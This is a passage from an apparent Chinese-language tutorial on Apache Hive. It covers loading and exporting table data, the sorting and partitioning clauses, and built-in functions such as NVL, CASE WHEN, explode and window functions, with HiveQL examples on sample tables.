向表中装载数据（Load）</h3><p><strong>1）语法</strong></p><p>hive&gt; load data [local] inpath ‘数据的path’ [overwrite] into table student [partition (partcol1=val1,…)];</p><p>（1）load data:表示加载数据</p><p>（2）local:表示从本地加载数据到hive表；否则从HDFS加载数据到hive表</p><p>（3）inpath:表示加载数据的路径</p><p>（4）overwrite:表示覆盖表中已有数据，否则表示追加</p><p>（5）into table:表示加载到哪张表</p><p>（6）student:表示具体的表</p><p>（7）partition:表示上传到指定分区</p><p><strong>2）实操案例</strong></p><p>（0）创建一张表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table student<span class="token punctuation">(</span>id string, name string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（1）加载本地文件到hive</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/student.txt'</span> into table default.student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）加载HDFS文件到hive中</p><p>上传文件到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/hive/datas/student.txt /user/molly/hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载HDFS上数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data inpath <span class="token string">'/user/molly/hive/student.txt'</span> into table default.student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）加载数据覆盖表中已有的数据</p><p>上传文件到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/datas/student.txt /user/molly/hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载数据覆盖表中已有的数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data inpath <span class="token string">'/user/molly/hive/student.txt'</span> overwrite into table default.student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1-2-通过查询语句向表中插入数据（Insert）"><a href="#3-1-2-通过查询语句向表中插入数据（Insert）" class="headerlink" title="3.1.2 通过查询语句向表中插入数据（Insert）"></a>3.1.2 通过查询语句向表中插入数据（Insert）</h3><p>1）创建一张表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table student_par<span class="token punctuation">(</span>id int, name string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）基本插入数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert into table student_par values<span class="token punctuation">(</span>1,<span class="token string">'wangwu'</span><span class="token punctuation">)</span>,<span class="token punctuation">(</span>2,<span class="token string">'zhaoliu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）基本模式插入（根据单张表查询结果）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite table student_par <span class="token keyword">select</span> id, name from student <span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>insert into：以追加数据的方式插入到表或分区，原有数据不会删除</p><p>insert overwrite：会覆盖表中已存在的数据</p><p>注意：insert不支持插入部分字段</p><p>4）多表（多分区）插入模式（根据多张表查询结果）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> from student​       insert overwrite table student partition<span class="token punctuation">(</span>month<span class="token operator">=</span><span class="token string">'201707'</span><span class="token punctuation">)</span>​       <span class="token keyword">select</span> id, name where month<span class="token operator">=</span><span class="token string">'201709'</span>​       insert overwrite table student partition<span class="token punctuation">(</span>month<span class="token operator">=</span><span class="token string">'201706'</span><span class="token punctuation">)</span>​       <span class="token keyword">select</span> id, name where month<span class="token operator">=</span><span class="token string">'201709'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-3-查询语句中创建表并加载数据（As-Select）"><a href="#3-1-3-查询语句中创建表并加载数据（As-Select）" class="headerlink" title="3.1.3 查询语句中创建表并加载数据（As Select）"></a>3.1.3 查询语句中创建表并加载数据（As Select）</h3><p>根据查询结果创建表（查询的结果会添加到新创建的表中）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>create table <span class="token keyword">if</span> not exists student3 as <span class="token keyword">select</span> id, name from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1-4-创建表时通过Location指定加载数据路径—用的多"><a href="#3-1-4-创建表时通过Location指定加载数据路径—用的多" class="headerlink" title="3.1.4 创建表时通过Location指定加载数据路径—用的多"></a>3.1.4 创建表时通过Location指定加载数据路径—用的多</h3><p>1）上传数据到hdfs上</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir /student<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/datas/student.txt /student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）创建表，并指定在hdfs上的位置</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create external table <span class="token keyword">if</span> not exists student5<span class="token punctuation">(</span>​       <span class="token function">id</span> int, name string<span class="token punctuation">)</span>​       row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span>​       location '/student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>先建表，后指定hdfss数据文件到该表。</p><pre class="line-numbers language-bash"><code class="language-bash">hadoop fs -put test.txt /test2.table<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from student5<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1-5-Import数据到指定Hive表中"><a href="#3-1-5-Import数据到指定Hive表中" class="headerlink" title="3.1.5 Import数据到指定Hive表中"></a>3.1.5 Import数据到指定Hive表中</h3><p>注意：先用export导出后，再将数据导入。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token function">import</span> table student2  from <span class="token string">'/user/hive/warehouse/export/student'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-数据导出"><a href="#3-2-数据导出" class="headerlink" title="3.2 数据导出"></a>3.2 数据导出</h2><h3 id="3-2-1-Insert导出"><a href="#3-2-1-Insert导出" class="headerlink" title="3.2.1 Insert导出"></a>3.2.1 Insert导出</h3><p>1）将查询的结果导出到本地(有local)</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite local directory <span class="token string">'/opt/module/hive/datas/export/student'</span>​      <span class="token keyword">select</span> * from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）将查询的结果<strong>格式化</strong>导出到本地</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>insert overwrite local directory <span class="token string">'/opt/module/hive/datas/export/student1'</span>​      ROW FORMAT DELIMITED FIELDS TERMINATED BY <span class="token string">'\t'</span>       <span class="token keyword">select</span> * from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3）将查询的结果导出到HDFS上(没有local)</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite directory <span class="token string">'/user/molly/student2'</span>​       ROW FORMAT DELIMITED FIELDS TERMINATED BY <span class="token string">'\t'</span> ​       <span class="token keyword">select</span> * from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-Hadoop命令导出到本地"><a href="#3-2-2-Hadoop命令导出到本地" class="headerlink" title="3.2.2 Hadoop命令导出到本地"></a>3.2.2 Hadoop命令导出到本地</h3><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -get /user/hive/warehouse/student/student.txt/opt/module/datas/export/student3.txt<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3-Hive-Shell-命令导出"><a href="#3-2-3-Hive-Shell-命令导出" class="headerlink" title="3.2.3 Hive Shell 命令导出"></a>3.2.3 Hive Shell 命令导出</h3><p>基本语法：（hive -f/-e 执行语句或者脚本 &gt; file）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive -e <span class="token string">'select * from default.student;'</span> <span class="token operator">></span> /opt/module/hive/datas/export/student4.txt<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4-Export导出到HDFS上"><a href="#3-2-4-Export导出到HDFS上" class="headerlink" title="3.2.4 Export导出到HDFS上"></a>3.2.4 Export导出到HDFS上</h3><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>export table default.student to <span class="token string">'/user/hive/warehouse/export/student'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>export和import主要用于两个Hadoop平台集群之间Hive表迁移。</p><h3 id="3-2-5-清除表中数据（Truncate）"><a href="#3-2-5-清除表中数据（Truncate）" class="headerlink" title="3.2.5 清除表中数据（Truncate）"></a>3.2.5 清除表中数据（Truncate）</h3><p>注意：Truncate只能删除管理表，不能删除外部表中数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> truncate table student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="4-数据查询—用的很多"><a href="#4-数据查询—用的很多" class="headerlink" title="4  数据查询—用的很多"></a>4  数据查询—用的很多</h1><p><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Select">查询语句语法</a>：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT <span class="token punctuation">[</span>ALL <span class="token operator">|</span> DISTINCT<span class="token punctuation">]</span> select_expr, select_expr, <span class="token punctuation">..</span>. FROM table_reference <span class="token punctuation">[</span>WHERE where_condition<span class="token punctuation">]</span> -筛选条件 <span class="token punctuation">[</span>GROUP BY col_list<span class="token punctuation">]</span>---分组 <span class="token punctuation">[</span>HAVING having_condition<span class="token punctuation">]</span>---分组后的过滤条件 <span class="token punctuation">[</span>ORDER BY col_list<span class="token punctuation">]</span>—--全局排序 <span class="token punctuation">[</span>CLUSTER BY col_list—---分区排序<span class="token operator">|</span> <span class="token punctuation">[</span>DISTRIBUTE BY col_list<span class="token punctuation">]</span> –---分区排序  类似MR中的分区<span class="token punctuation">[</span>SORT BY col_list<span class="token punctuation">]</span> –区内排序 <span class="token punctuation">]</span> <span class="token punctuation">[</span>LIMIT number<span class="token punctuation">]</span>--限制返回条数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>HQL查询语法和sql大致相同，这里就不一一列举，这里需要提出说的是排序的用法。</p><p>需要知道的是order by是全局排序，针对所有数据进行排序；SORT BY是分区内的排序</p><h3 id="4-1-全局排序（Order-By）"><a href="#4-1-全局排序（Order-By）" class="headerlink" title="4.1 全局排序（Order By）"></a>4.1 全局排序（Order By）</h3><p>Order By：<strong>全局排序</strong>，只有一个Reducer</p><p>例如：查询员工信息按工资升序排列</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp order by sal<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-每个Reduce内部排序（Sort-By）"><a href="#4-2-每个Reduce内部排序（Sort-By）" class="headerlink" title="4.2 每个Reduce内部排序（Sort By）"></a>4.2 每个Reduce内部排序（Sort By）</h3><p>Sort By：对于大规模的数据集order by的效率非常低。在很多情况下，并不需要全局排序，此时可以使用sort by。</p><p><strong>Sort by为每个reducer产生一个排序文件（即为分区内的排序）。每个Reducer内部进行排序，对全局结果集来说不是排序</strong>。</p><p>1）设置reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapreduce.job.reduces<span class="token operator">=</span>3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）查看设置reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapreduce.job.reduces<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）根据部门编号降序查看员工信息</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp <span class="token function">sort</span> by deptno desc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）将查询结果导入到文件中（按照部门编号降序排序）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite local directory <span class="token string">'/opt/module/hive/datas/sortby-result'</span> <span class="token keyword">select</span> * from emp <span class="token function">sort</span> by deptno desc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-3-分区（Distribute-By）"><a href="#4-3-分区（Distribute-By）" class="headerlink" title="4.3 分区（Distribute By）"></a>4.3 分区（Distribute By）</h3><p>Distribute By： 在有些情况下，我们需要控制某个特定行应该到哪个reducer，通常是为了进行后续的聚集操作。<strong>distribute by</strong> 子句可以做这件事。<strong>distribute by</strong>类似MR中partition（自定义分区），进行分区，结合sort by使用。 </p><p>对于distribute by进行测试，一定要分配多reduce进行处理，否则无法看到distribute by的效果。</p><p>1）案例实操：</p><p>（1）先按照部门编号分区，再按照员工编号降序排序。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapreduce.job.reduces<span class="token operator">=</span>3<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite local directory <span class="token string">'/opt/module/hive/datas/distribute-result'</span> <span class="token keyword">select</span> * from emp distribute by deptno <span class="token function">sort</span> by empno desc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意：</p><p>Ø distribute by的分区规则是根据分区字段的hash码与reduce的个数进行模除后，余数相同的分到一个区。</p><p>Ø Hive要求DISTRIBUTE BY语句要写在SORT BY语句之前。</p><h3 id="4-4-Cluster-By"><a href="#4-4-Cluster-By" class="headerlink" title="4.4 Cluster By"></a>4.4 Cluster By</h3><p>当distribute by和sort by字段相同时，可以使用cluster by方式。</p><p>cluster by除了具有distribute by的功能外还兼具sort by的功能。但是排序只能是升序排序，不能指定排序规则为ASC或者DESC。</p><p>（1）以下两种写法等价</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp cluster by deptno<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp distribute by deptno <span class="token function">sort</span> by deptno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意：按照部门编号分区，不一定就是固定死的数值，可以是20号和30号部门分到一个分区里面去。</p><h1 id="5-函数使用"><a href="#5-函数使用" class="headerlink" title="5 函数使用"></a>5 函数使用</h1><h2 id="5-1-系统内置函数"><a href="#5-1-系统内置函数" class="headerlink" title="5.1 系统内置函数"></a>5.1 系统内置函数</h2><p>1）查看系统自带的函数</p><pre><code>hive&gt; show functions;</code></pre><p>2）显示自带的函数的用法</p><pre><code>hive&gt; desc function upper;</code></pre><p>3）详细显示自带的函数的用法</p><pre><code>hive&gt; desc function extended upper;</code></pre><h2 id="5-2-常用内置函数"><a href="#5-2-常用内置函数" class="headerlink" title="5.2 常用内置函数"></a>5.2 常用内置函数</h2><h3 id="5-2-1-空字段赋值"><a href="#5-2-1-空字段赋值" class="headerlink" title="5.2.1 空字段赋值"></a>5.2.1 空字段赋值</h3><p>1）函数说明</p><p>NVL：给值为NULL的数据赋值，它的格式是NVL( value，default_value)。它的功能是如果value为NULL，则NVL函数返回default_value的值，否则返回value的值，如果两个参数都为NULL ，则返回NULL。</p><p>2）数据准备：采用员工表</p><p>3）查询：如果员工的comm为NULL，则用-1代替</p><pre><code>hive (default)&gt; select comm,nvl(comm, -1) from emp;</code></pre><h3 id="5-2-2-CASE-WHEN-THEN-ELSE-END"><a href="#5-2-2-CASE-WHEN-THEN-ELSE-END" class="headerlink" title="5.2.2 CASE WHEN THEN ELSE END"></a>5.2.2 CASE WHEN THEN ELSE END</h3><p>1）数据准备</p><table><thead><tr><th>name</th><th>dept_id</th><th>sex</th></tr></thead><tbody><tr><td>悟空</td><td>A</td><td>男</td></tr><tr><td>大海</td><td>A</td><td>男</td></tr><tr><td>宋宋</td><td>B</td><td>男</td></tr><tr><td>凤姐</td><td>A</td><td>女</td></tr><tr><td>婷姐</td><td>B</td><td>女</td></tr><tr><td>婷婷</td><td>B</td><td>女</td></tr></tbody></table><p>2）需求</p><p>求出不同部门男女各多少人。结果如下：</p><p>dept_Id   男    女</p><p>A      2    1</p><p>B      1    2</p><p>3）按需求查询数据</p><p>select </p><pre><code> dept_id, sum(case sex when &#39;男&#39; then 1 else 0 end) male_count, sum(case sex when &#39;女&#39; then 1 else 0 end) female_countfrom  emp_sexgroup by dept_id;</code></pre><h3 id="5-2-3-行转列"><a href="#5-2-3-行转列" class="headerlink" title="5.2.3 行转列"></a>5.2.3 行转列</h3><p>1）相关函数说明</p><p><strong>CONCAT</strong>(string A/col, string B/col…)：返回输入字符串连接后的结果，支持任意个输入字符串;</p><p><strong>CONCAT_WS</strong>(separator, str1, str2,…)：它是一个特殊形式的 CONCAT()。第一个参数剩余参数间的分隔符。分隔符可以是与剩余参数一样的字符串。如果分隔符是 NULL，返回值也将为 NULL。这个函数会跳过分隔符参数后的任何 NULL 和空字符串。分隔符将被加到被连接的字符串之间;</p><p>注意: CONCAT_WS must be “string or array<string></string></p><p><strong>COLLECT_SET</strong>(col)：函数只接受基本数据类型，它的主要作用是将某字段的值进行去重汇总，产生array类型字段。</p><p><strong>COLLECT_list</strong>(col): 相比COLLECT_SET就是不去重的操作。</p><p>2）数据准备</p><table><thead><tr><th>name</th><th>constellation</th><th>blood_type</th></tr></thead><tbody><tr><td>孙悟空</td><td>白羊座</td><td>A</td></tr><tr><td>大海</td><td>射手座</td><td>A</td></tr><tr><td>宋宋</td><td>白羊座</td><td>B</td></tr><tr><td>猪八戒</td><td>白羊座</td><td>A</td></tr><tr><td>凤姐</td><td>射手座</td><td>A</td></tr><tr><td>苍老师</td><td>白羊座</td><td>B</td></tr></tbody></table><p>3）需求</p><p>把星座和血型一样的人归类到一起。结果如下：</p><pre><code>射手座,A      大海|凤姐白羊座,A      孙悟空|猪八戒白羊座,B       宋宋|苍老师</code></pre><p>4）创建本地constellation.txt，导入数据</p><pre><code>[molly@hadoop102 datas]$ vim person_info.txt孙悟空  白羊座  A大海 射手座  A宋宋 白羊座  B猪八戒  白羊座  A凤姐 射手座  A苍老师  白羊座  B</code></pre><p>5）创建hive表并导入数据</p><pre><code>create table person_info(name string, constellation string, blood_type string) row format delimited fields terminated by &quot;\t&quot;;load data local inpath &quot;/opt/module/hive/datas/person_info.txt&quot; into table person_info;</code></pre><p>6）按需求查询数据</p><pre><code>SELECT t1.c_b , CONCAT_WS(&quot;|&quot;,collect_set(t1.name))FROM (SELECT NAME ,CONCAT_WS(&#39;,&#39;,constellation,blood_type) c_bFROM person_info)t1 GROUP BY t1.c_b</code></pre><h3 id="5-2-4-列转行"><a href="#5-2-4-列转行" class="headerlink" title="5.2.4 列转行"></a>5.2.4 列转行</h3><p>1）函数说明</p><p>**EXPLODE(col)**：将hive一列中复杂的array或者map结构拆分成多行。</p><p><strong>LATERAL VIEW</strong>（侧写表）</p><p>用法：LATERAL VIEW udtf(expression) tableAlias AS columnAlias</p><p>解释：用于和split, explode等UDTF一起使用，它能够将一列数据拆成多行数据，在此基础上可以对拆分后的数据进行聚合。</p><p>2）数据准备</p><p>表6-7 数据准备</p><table><thead><tr><th>movie</th><th>category</th></tr></thead><tbody><tr><td>《疑犯追踪》</td><td>悬疑,动作,科幻,剧情</td></tr><tr><td>《Lie to me》</td><td>悬疑,警匪,动作,心理,剧情</td></tr><tr><td>《战狼2》</td><td>战争,动作,灾难</td></tr></tbody></table><p>3）需求</p><p>将电影分类中的数组数据展开。结果如下：</p><pre><code>《疑犯追踪》   悬疑《疑犯追踪》   动作《疑犯追踪》   科幻《疑犯追踪》   剧情《Lie to me》  悬疑《Lie to me》  警匪《Lie to me》  动作《Lie to me》  心理《Lie to me》  剧情《战狼2》     战争《战狼2》     动作《战狼2》     灾难</code></pre><p>4）创建本地movie.txt，导入数据</p><pre><code>[molly@hadoop102 datas]$ vi movie_info.txt《疑犯追踪》 悬疑,动作,科幻,剧情《Lie to me》 悬疑,警匪,动作,心理,剧情《战狼2》 战争,动作,灾难</code></pre><p>5）创建hive表并导入数据</p><pre><code>create table movie_info(  movie string,   category string) row format delimited fields terminated by &quot;\t&quot;;load data local inpath &quot;/opt/module/hive/datas/movie_info.txt&quot; into table movie_info;</code></pre><p>6）按需求查询数据</p><pre><code>SELECT movie,category_name FROM movie_info lateral VIEWexplode(split(category,&quot;,&quot;)) movie_info_tmp AS category_name ;</code></pre><h3 id="5-2-5-窗口函数（开窗函数）"><a href="#5-2-5-窗口函数（开窗函数）" class="headerlink" title="5.2.5 窗口函数（开窗函数）"></a>5.2.5 窗口函数（开窗函数）</h3><p>1）相关函数说明</p><p>**OVER()**：指定分析函数工作的数据窗口大小，这个数据窗口大小可能会随着行的改变而变化。涉及关键字如下</p><table><thead><tr><th>CURRENT ROW</th><th>当前行</th></tr></thead><tbody><tr><td>n PRECEDING</td><td>往前n行数据</td></tr><tr><td>n FOLLOWING</td><td>往后n行数据</td></tr><tr><td>UNBOUNDED</td><td>起点</td></tr><tr><td>UNBOUNDED PRECEDING</td><td>表示从前面的起点</td></tr><tr><td>UNBOUNDED FOLLOWING</td><td>表示到后面的终点</td></tr><tr><td>LAG(col,n,default_val)</td><td>往前第n行数据</td></tr><tr><td>LEAD(col,n, default_val)</td><td>往后第n行数据</td></tr><tr><td>NTILE(n)</td><td>把有序窗口的行分发到指定数据的组中，各个组有编号，编号从1开始，对于每一行，NTILE返回此行所属的组的编号。注意：n必须为int类型</td></tr></tbody></table><p><strong>总结如下：</strong></p><p><strong>OVER()</strong> 默认为每条数据都开一个窗口，窗口大小是当前数据集的大小。</p><p><strong>OVER(partition by…. )</strong> 会按照指定字段进行分区，将分区字段的值仙童的数据划分到相同的区；每个区中的每条数据都会开启一个窗口，每条数据的窗口大小默认为当前分区数据的大小。</p><p><strong>OVER(order by …)</strong> 会在窗口中按照指定的字段对数据进行排序，会为每条数据都开启一个窗口，默认窗口大小为从数据集开始到当前行。</p><p>**OVER(partition by …order by..)**：会按照指定的字段进行分区，将分区字段的值仙童的数据划分到相同的区，在每个区会按照指定字段进行排序；每个区中的每条数据都会开启一个窗口，每条数据的窗口大小默认为当前分区中从数据集开始到当前行。相当于：partition by name order by orderdate rows between UNBOUNDED PRECEDING and current row</p><p><strong>关键字总结</strong></p><table><thead><tr><th>Order by</th><th>全局排序；窗口函数中排序</th></tr></thead><tbody><tr><td>Distribute by</td><td>分区</td></tr><tr><td>Sort by</td><td>区内排序</td></tr><tr><td>Cluster by</td><td>分区排序</td></tr><tr><td>Partition by</td><td>窗口函数中分区</td></tr><tr><td>Partitioned by</td><td>建表 指定分区字段</td></tr><tr><td>Clustered by</td><td>建表 指定分桶字段</td></tr></tbody></table><p><strong>注意partition by …order by组合；Distribute by和Sort by 组合使用</strong></p><p>2）数据准备：name，orderdate，cost</p><pre class="line-numbers language-sh"><code class="language-sh">jack,2017-01-01,10tony,2017-01-02,15jack,2017-02-03,23tony,2017-01-04,29jack,2017-01-05,46jack,2017-04-06,42tony,2017-01-07,50jack,2017-01-08,55mart,2017-04-08,62mart,2017-04-09,68neil,2017-05-10,12mart,2017-04-11,75neil,2017-06-12,80mart,2017-04-13,94<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）需求</p><p>（1）查询在2017年4月份购买过的顾客及总人数</p><p>（2）查询顾客的购买明细及月购买总额</p><p>（3）上述的场景, 将每个顾客的cost按照日期进行累加</p><p>（4）查询每个顾客上次的购买时间</p><p>（5）查询前20%时间的订单信息</p><p>4）创建本地business.txt，导入数据</p><pre><code>[molly@hadoop102 datas]$ vi business.txt</code></pre><p>5）创建hive表并导入数据</p><pre><code>create table business(name string, orderdate string,cost int) ROW FORMAT DELIMITED FIELDS TERMINATED BY &#39;,&#39;;load data local inpath &quot;/opt/module/hive/datas/business.txt&quot; into table business;</code></pre><p>6）按需求查询数据</p><p>（1）      查询在2017年4月份购买过的顾客及总人数</p><pre><code>select name,count(*) over () from business where substring(orderdate,1,7) = &#39;2017-04&#39; group by name;</code></pre><p>（2）      查询顾客的购买明细及所有顾客的月购买总额</p><p>使用分区：按照每个月做分区</p><pre><code>sum(cost) over(partition by month(orderdate))：表示对某个月的所有顾客的购买总额求sum；当前over的窗口大小是分区大小。select name,orderdate,cost,sum(cost) over(partition by month(orderdate)) frombusiness;</code></pre><p>（3）      将每个顾客的cost按照日期进行累加</p><pre><code>select name,orderdate,cost, sum(cost) over() as sample1,--所有行相加 sum(cost) over(partition by name) as sample2,--按name分组，组内数据相加 sum(cost) over(partition by name order by orderdate) as sample3,--按name分组，组内数据累加 </code></pre><p>rows必须跟在Order by 子句之后，对排序的结果进行限制，使用固定的行数来限制分区中的数据行数量</p><p>sample3的执行结果如下：</p><p>​                                <img src="/2020/11/15/bigdata-hive2/1637036085261.png" alt="1637036085261"></p><p><strong>拓展：数据窗口大小变化</strong></p><pre><code>sum(cost) over(partition by name order by orderdate rows between UNBOUNDED PRECEDING and current row ) as sample4 ,--和sample3一样,由起点到当前行的聚合 sum(cost) over(partition by name order by orderdate rows between 1 PRECEDING and current row) as sample5, --当前行和前面一行做聚合 sum(cost) over(partition by name order by orderdate rows between 1 PRECEDING AND 1 FOLLOWING ) as sample6,--当前行和前边一行及后面一行 sum(cost) over(partition by name order by orderdate rows between current row and UNBOUNDED FOLLOWING ) as sample7 --当前行及后面所有行 from business;</code></pre><p> （4）      查看顾客上次的购买时间和下一次购买时间：使用lag和lead函数</p><pre><code>select name,orderdate,cost, lag(orderdate,1,&#39;1900-01-01&#39;) over(partition by name order by orderdate ) as p_ orderdate, lead(orderdate,1,&#39;9999-01-01&#39;) over (partition by name order by orderdate) as p_ orderdatefrom business;</code></pre><p>​                  <img src="/2020/11/15/bigdata-hive2/1637036128510.png" alt="1637036128510"></p><p>（5）      查询前20%时间的订单信息，使用NTILE函数进行分组。按照时间排序分成5组，取第一个组，即前20%</p><pre><code>select * from (  select name,orderdate,cost, ntile(5) over(order by orderdate) gid   from business) twhere t. gid = 1;</code></pre><p>​                      <img src="/2020/11/15/bigdata-hive2/1637036162813.png" alt="1637036162813">  </p><h3 id="5-2-6-Rank"><a href="#5-2-6-Rank" class="headerlink" title="5.2.6 Rank"></a>5.2.6 Rank</h3><p>1）函数说明</p><p><strong>RANK() 